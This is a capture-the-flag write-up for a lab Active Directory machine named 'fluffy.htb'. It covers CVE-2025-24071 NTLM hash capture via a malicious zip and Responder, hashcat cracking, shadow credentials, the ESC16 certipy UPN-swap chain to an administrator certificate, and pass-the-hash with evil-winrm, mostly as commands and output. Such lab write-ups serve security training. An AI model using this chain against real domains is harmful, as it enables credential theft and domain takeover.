#ESC16

10.10.11.69
The lab comes with credentials: ` j.fleischman / J0elTHEM4n1990! `

We will start with nmap:
```
sudo nmap -sC -sV -vv 10.10.11.69 -oA nmap/intialNmap

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-09-17 14:21:50Z)
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)

```

Our user can do `SMB`,`LDAP`. So, we start bloodhound
```
bloodhound-ce-python -d fluffy.htb  -dc dc01.fluffy.htb -u 'j.fleischman' -k -no-pass -ns 10.10.11.69
```

We investigate the SMB and found this in one of the pdfs:
![[Z Assets/Images/Pasted image 20250917182534.jpeg]]

By looking at `CVE-2025-24071`, we found if we apple to put malicious zip file in the server, then someone tries to unzip it that will trigger request to our attacker `SMB` server contains the NTLM hash of the user who tried to do so. for more https://www.exploit-db.com/exploits/52310.

we create malicious zip file and put our SMB server. then uploaded the file using `SMB` shares
```py
    parser.add_argument("-i", "--ip", required=True, help="Attacker SMB IP address (e.g., 192.168.1.100)")
    parser.add_argument("-n", "--name", default="malicious", help="Base filename (default: malicious)")
    parser.add_argument("-o", "--output", default="output", help="Output directory (default: ./output)")
    parser.add_argument("--keep", action="store_true", help="Keep .library-ms file after ZIP creation")
```

![[Z Assets/Images/Pasted image 20250917182927.jpeg]]

```
smb: \> put malicious.zip
smb: \> ls
  malicious.zip                       A      325  Wed Sep 17 22:24:16 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 17:31:07 2025
```

After a while, some user tried to unzip it, then we got his hash:
```
sudo responder.py -I tun0 

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:0a173a0cd79ff82f:232A2B358FE8F48E22A24D97D6FADFF9:0101000000000000001A12190028DC012C5DF811DAED85890000000002000800580058003800590001001E00570049004E002D004E00500036004C004700570042004A0043005100450004003400570049004E002D004E00500036004C004700570042004A004300510045002E0058005800380059002E004C004F00430041004C000300140058005800380059002E004C004F00430041004C000500140058005800380059002E004C004F00430041004C0007000800001A12190028DC0106000400020000000800300030000000000000000100000000200000B3D190B61EBAB79C92A75B4302758F2720EEB6956AC80A1BE37FE6A95309C6C80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320032000000000000000000
```

try to crack it:
```
hashcat -m 5600 hashs.txt /opt/lists/rockyou.txt 

prometheusx-303
```


 `p.agila : prometheusx-303`

---

Lets check bloodhound using the new user:
![[Z Assets/Images/Pasted image 20250918024412.jpeg]]
![[Z Assets/Images/Pasted image 20250918024456.jpeg]]
![[Z Assets/Images/Pasted image 20250918063825.jpeg]]

And if we looked at certipy output:
```
Certificate Authorities                                                                                        
  0                                                                                                            
    CA Name                             : fluffy-DC01-CA                                                       
    DNS Name                            : DC01.fluffy.htb                                                      
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb                                 
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5                                     
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00                                            
    Certificate Validity End            : 3024-04-17 16:11:16+00:00                                            
    Web Enrollment                                                                                             
      HTTP                                                                                                     
        Enabled                         : False                                                                
      HTTPS                                                                                                    
        Enabled                         : False                   
    User Specified SAN                  : Disabled                 
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2       <-- Notice ---> this why we got ESC16
    Permissions
      Owner                             : FLUFFY.HTB\Administrators           
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins       
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers  <--- Notice --->
    [!] Vulnerabilities                                                                          
      ESC16                             : Security Extension is disabled.
    [*] Remarks                                                                                  
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

As we can see we have attack path to get `WINRM_SVC `& `CA_SVC`.

---

First, lets add `p.agila` to `SERVICE ACCOUNTS`:
```
bloodyAD -d fluffy.htb --dc-ip 10.10.11.69 -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'P.AGILA'
```

Then, lets do `shadow credentials` to abuse `GenericWrite` permissions.
```
pywhisker -d 'fluffy.htb' --dc-ip 10.10.11.69 -u 'p.agila' -p 'prometheusx-303' -k  --target 'CA_SVC' --action 'add'
```

Now, we have got the certificates, we can get tgt ticket then do what ever we want in the service
```
gettgtpkinit.py -cert-pfx PQ92rPNQ.pfx \
  -pfx-pass 'GwqE6vfXAYuxCbYGpZG6' \
  -dc-ip 10.10.11.69 \
  'fluffy.htb/CA_SVC' \
  ./CA_SVC.ccache

export KRB5CCNAME=CA_SVC.ccache
```

if we do `certpy find`we will find that its vuln to ESC16.
Exploit:
```sh

# My Exploit !!!
export KRB5CCNAME=CA_SVC.ccache

#Change UPN of user to administrator
certipy account \
	-u 'CA_SVC@fluffy.htb' -no-pass -k -target DC01.fluffy.htb  \
    -dc-ip '10.10.11.69' -upn 'Administrator'  \
      -user 'CA_SVC' update
     

#Request the certificate while it has administrator UPN
certipy req \
	-u 'CA_SVC@fluffy.htb' -no-pass -k -target DC01.fluffy.htb  \
    -dc-ip '10.10.11.69' -ca 'fluffy-DC01-CA' \
     -template 'User'
     

#Change the UPN of the user back again
certipy account \
    -u 'CA_SVC@fluffy.htb' -no-pass -k -target DC01.fluffy.htb  \
    -dc-ip '10.10.11.69' -user 'CA_SVC' \         
     -upn 'CA_SVC@fluffy.htb' update
     

#Authenticate using certificate you got.
certipy auth \   
    -dc-ip '10.10.11.69' -pfx 'administrator.pfx' \
	-domain 'fluffy.htb'


Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e


# write up exploit

#Read the initial UPN of the victim's account (optional - for restore).
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read

#Update the UPN for the victim account for the target administrator sAMAccountName.
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update

#Request a certificate issued as a “Victim” user from any appropriate client authentication template* on a CA* vulnerable to an ESC16 attack* (e.g., “user”)
certipy shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
export KRB5CCNAME=ca_svc.ccache 

#Then ask for a certificate.
certipy req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'

#Restore the UPN for the “Victim” account.
certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update

#Authenticate as the target administrator.
certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
```

```
evil-winrm -i 10.10.11.69  -u 'administrator'  -H 8da83a3fa618b6e3a00e93f676c92a6e
```

GG

```

```